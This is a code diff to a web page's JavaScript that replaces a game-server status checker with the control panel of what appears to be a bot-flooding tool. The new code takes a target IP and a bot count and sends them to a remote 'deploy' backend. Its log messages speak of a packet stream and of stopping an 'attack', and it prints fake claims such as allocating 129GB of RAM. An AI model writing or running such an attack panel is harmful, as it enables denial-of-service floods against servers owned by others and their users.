@@ -1,25 +1,35 @@
-async function check() {
-    const ip = document.getElementById("ip").value;
-    const res = await fetch(`/status?ip=${ip}`);
-    const data = await res.json();
+const API_URL = "https://botbasma.onrender.com"; // Render adresini buraya yaz
 
-    if (data.online) {
-        document.getElementById("statusBox").innerHTML =
-            `Status: 🟢 Online <br>
-             Players: ${data.players}/${data.max} <br>
-             Ping: ${data.ping} ms`;
-    } else {
-        document.getElementById("statusBox").innerHTML =
-            "🔴 Offline";
+function log(message) {
+    const output = document.getElementById('console-output');
+    output.innerHTML += `<br>> ${message}`;
+    output.scrollTop = output.scrollHeight;
+}
+
+async function deployBots() {
+    const ip = document.getElementById('serverIp').value;
+    const count = document.getElementById('botCount').value;
+
+    if(!ip) return alert("HEDEF IP YAZILMADI!");
+
+    log(`Initializing packet stream to ${ip}...`);
+    log(`Allocating 129GB RAM segments...`);
+
+    try {
+        const response = await fetch(`${API_URL}/deploy`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ ip, count })
+        });
+        const data = await response.json();
+        log(`SUCCESS: ${data.message}`);
+    } catch (err) {
+        log(`ERROR: Connection to Trigger-Engine failed!`);
     }
 }
 
-function vip() {
-    document.getElementById("vipStatus").innerText =
-        "VIP aktiv edildi ✅ (demo)";
-}
-
-function stress() {
-    document.getElementById("stressStatus").innerText =
-        "Stress test başladı... (simulyasiya)";
+async function stopBots() {
+    log(`Sending ABORT signal...`);
+    await fetch(`${API_URL}/stop`, { method: 'POST' });
+    log(`ATTACK STOPPED.`);
 }
